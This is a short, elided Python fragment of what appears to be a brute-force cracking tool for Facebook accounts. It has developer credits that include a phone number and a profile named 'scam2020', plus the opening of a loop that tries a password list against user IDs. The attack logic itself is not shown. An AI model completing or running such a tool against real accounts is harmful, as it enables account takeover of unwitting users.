...
number=int("+8801905054346")

devoloper_info={
    "Developer" :  'HUNTER-KING',
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/HUNTER-130',
    "Facebook" :  'facebook.com/scam2020',
    }
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mBK-XD\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
